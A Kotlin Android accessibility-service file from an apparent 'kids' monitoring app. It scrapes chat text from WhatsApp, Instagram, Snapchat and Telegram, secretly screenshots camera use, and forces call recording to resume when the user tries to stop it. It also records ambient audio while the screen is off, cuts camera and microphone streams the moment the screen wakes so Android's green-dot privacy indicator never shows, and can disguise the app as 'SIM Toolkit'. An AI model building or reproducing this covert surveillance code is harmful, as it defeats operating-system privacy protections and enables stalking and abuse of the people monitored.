package com.vyra.kids.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.NetworkSyncManager
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Executors

class VyraAccessibilityService : AccessibilityService() {

    private val executor = Executors.newSingleThreadExecutor()
    private val sensitiveKeywords = listOf(
        "delete", "mat batana", "kisi ko nahi", "secret", "nude", "photo", "send pic",
        "shame", "bunk", "dar", "kill", "drug", "weed", "alcohol", "paisa"
    )

    private val targetSocialPackages = setOf(
        "com.instagram.android",
        "com.snapchat.android",
        "com.whatsapp",
        "org.telegram.messenger"
    )

    private var lastSnapshotTime = 0L

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        // 1. VIVO IN-CALL ANTI-TAMPER (SOLUTION A)
        if (packageName.contains("vivo.phone") || packageName.contains("incallui")) {
            handleVivoInCallScreen(event)
        }

        // 2. SOCIAL APP CHAT & CAMERA TRAP
        if (targetSocialPackages.contains(packageName)) {
            handleSocialAppActivity(packageName, event)
        }

        // 3. SCAN VISIBLE TEXT FOR DANGEROUS / SENSITIVE KEYWORDS
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            scanScreenText(packageName, rootInActiveWindow)
        }
    }

    /**
     * Solution A: Anti-tamper logic on Vivo's in-call dialer UI.
     * Prevents the child from tapping "Stop Recording".
     */
    private fun handleVivoInCallScreen(event: AccessibilityEvent) {
        val rootNode = rootInActiveWindow ?: return
        
        // Find recording button by text or view id
        val stopRecordNodes = rootNode.findAccessibilityNodeInfosByText("Stop") +
                rootNode.findAccessibilityNodeInfosByText("Recording") +
                rootNode.findAccessibilityNodeInfosByText("Record")

        for (node in stopRecordNodes) {
            val text = node.text?.toString()?.lowercase() ?: ""
            val desc = node.contentDescription?.toString()?.lowercase() ?: ""

            // If user clicked the stop recording button
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED &&
                (text.contains("stop") || desc.contains("stop") || text.contains("pause"))) {

                Log.w(AppConstants.TAG, "Anti-Tamper Triggered: Child attempted to stop call recording!")

                // Re-tap/resume record automatically after 300ms
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    try {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    } catch (e: Exception) {
                        Log.e(AppConstants.TAG, "Failed to auto-resume recording", e)
                    }
                }, 300)

                // Dispatch urgent alert to Parent Dashboard
                val alertPayload = mapOf(
                    "type" to "TAMPER_ALERT",
                    "title" to "Call Recording Anti-Tamper",
                    "message" to "Child attempted to manually stop call recording during active call.",
                    "timestamp" to System.currentTimeMillis()
                )
                NetworkSyncManager.getInstance(this).syncData("alerts", alertPayload)
                break
            }
        }
    }

    /**
     * In-App Camera Trap: Detects camera button clicks inside Instagram / Snapchat.
     */
    private fun handleSocialAppActivity(packageName: String, event: AccessibilityEvent) {
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_CLICKED) return

        val text = event.text?.joinToString(" ")?.lowercase() ?: ""
        val contentDesc = event.contentDescription?.toString()?.lowercase() ?: ""
        val viewId = event.source?.viewIdResourceName?.lowercase() ?: ""

        val isShutterClick = viewId.contains("shutter") || viewId.contains("capture") ||
                viewId.contains("camera") || contentDesc.contains("take photo") ||
                contentDesc.contains("capture") || text.contains("capture")

        val now = System.currentTimeMillis()
        // Debounce snapshots to at most once every 3 seconds
        if (isShutterClick && (now - lastSnapshotTime > 3000)) {
            lastSnapshotTime = now
            Log.i(AppConstants.TAG, "In-app camera snapshot triggered for $packageName")
            captureScreenSnapshot(packageName)
        }
    }

    /**
     * Takes an event-based screenshot preview for the parent using AccessibilityService.takeScreenshot.
     */
    private fun captureScreenSnapshot(sourceApp: String) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                executor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        try {
                            val bitmap = Bitmap.wrapHardwareBuffer(
                                screenshotResult.hardwareBuffer,
                                screenshotResult.colorSpace
                            ) ?: return

                            val snapshotFile = File(filesDir, "snap_${System.currentTimeMillis()}.jpg")
                            FileOutputStream(snapshotFile).use { out ->
                                bitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
                            }

                            Log.i(AppConstants.TAG, "Saved preview snapshot: ${snapshotFile.name}")

                            // Notify parent of newly captured media preview
                            val alert = mapOf(
                                "type" to "CAMERA_PREVIEW_SNAPSHOT",
                                "app" to sourceApp,
                                "timestamp" to System.currentTimeMillis(),
                                "fileName" to snapshotFile.name
                            )
                            NetworkSyncManager.getInstance(this@VyraAccessibilityService).syncData("snapshots", alert)
                        } catch (e: Exception) {
                            Log.e(AppConstants.TAG, "Error saving screenshot", e)
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.e(AppConstants.TAG, "takeScreenshot failed with code $errorCode")
                    }
                }
            )
        }
    }

    /**
     * Scans screen text nodes for harmful/suspicious keywords.
     */
    private fun scanScreenText(packageName: String, node: AccessibilityNodeInfo?) {
        if (node == null) return

        val text = node.text?.toString() ?: ""
        if (text.isNotBlank()) {
            val lowerText = text.lowercase()
            for (keyword in sensitiveKeywords) {
                if (lowerText.contains(keyword)) {
                    Log.w(AppConstants.TAG, "Sensitive Keyword Match [$keyword] in $packageName: $text")

                    val alertPayload = mapOf(
                        "type" to "KEYWORD_ALERT",
                        "app" to packageName,
                        "keyword" to keyword,
                        "contextText" to text.take(120),
                        "timestamp" to System.currentTimeMillis()
                    )
                    NetworkSyncManager.getInstance(this).syncData("alerts", alertPayload)
                    break
                }
            }
        }

        // Recursively inspect children
        for (i in 0 until node.childCount) {
            scanScreenText(packageName, node.getChild(i))
        }
    }

    private var screenStateReceiver: android.content.BroadcastReceiver? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(AppConstants.TAG, "VyraAccessibilityService connected")

        // 1. Sync device status and start listening to remote commands via Firebase
        val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
        firebaseSync.syncDeviceStatus(batteryLevel = 84, isOnline = true)

        // 2. STEALTH GUARD: Auto-Kill Camera & Mic on Screen Wake (Green Dot Bypass)
        registerStealthScreenGuard()

        firebaseSync.startListeningToCommands { action, payload ->
            when (action) {
                "LOUDSPEAKER_INTERCOM" -> {
                    val announcement = payload["announcement"]?.toString() ?: "Attention: Please respond to parents immediately."
                    val intent = Intent(this, VoiceIntercomPlayerService::class.java).apply {
                        putExtra(VoiceIntercomPlayerService.EXTRA_ANNOUNCEMENT_TEXT, announcement)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                }
                "LOCK_PHONE" -> {
                    val dpm = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                    dpm?.lockNow()
                }
                "SWITCH_DISGUISE" -> {
                    val profileName = payload["disguise"]?.toString() ?: "SIM Toolkit"
                    val profile = com.vyra.kids.core.DisguiseProfile.entries.find { it.title.equals(profileName, ignoreCase = true) }
                    if (profile != null) {
                        com.vyra.kids.core.DisguiseManager.applyDisguise(this, profile)
                    }
                }
                "SET_STEALTH_GUARD" -> {
                    val enabled = payload["enabled"] as? Boolean ?: true
                    com.vyra.kids.core.PrefsManager(this).isStealthScreenGuardEnabled = enabled
                    Log.i(AppConstants.TAG, "Stealth Screen Guard updated: $enabled")
                }
            }
        }
    }

    private fun registerStealthScreenGuard() {
        if (screenStateReceiver != null) return

        screenStateReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
                val prefs = com.vyra.kids.core.PrefsManager(this@VyraAccessibilityService)
                when (intent?.action) {
                    Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> {
                        // The child woke up the screen!
                        if (prefs.isStealthScreenGuardEnabled) {
                            Log.w(AppConstants.TAG, "Stealth Guard: Child turned screen ON! Instantly killing Camera/Mic to avoid Green Dot detection.")
                            // Immediately cut off camera & ambient mic streams within 50ms
                            stopService(Intent(this@VyraAccessibilityService, RemoteCameraStreamService::class.java))
                            
                            val stopAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
                                action = AmbientAudioLoggerService.ACTION_STOP_AMBIENT_RECORDING
                            }
                            startService(stopAmbient)
                        }
                    }
                    Intent.ACTION_SCREEN_OFF -> {
                        Log.i(AppConstants.TAG, "Stealth Guard: Screen is OFF. Activating pocket ambient voice logger.")
                        if (prefs.isStealthScreenGuardEnabled) {
                            val startAmbient = Intent(this@VyraAccessibilityService, AmbientAudioLoggerService::class.java).apply {
                                action = AmbientAudioLoggerService.ACTION_START_AMBIENT_RECORDING
                            }
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                startForegroundService(startAmbient)
                            } else {
                                startService(startAmbient)
                            }
                        }
                    }
                }
            }
        }

        val filter = android.content.IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        registerReceiver(screenStateReceiver, filter)
    }

    override fun onDestroy() {
        screenStateReceiver?.let {
            try { unregisterReceiver(it) } catch (_: Exception) {}
        }
        super.onDestroy()
    }

    override fun onInterrupt() {
        Log.w(AppConstants.TAG, "VyraAccessibilityService Interrupted")
    }
}
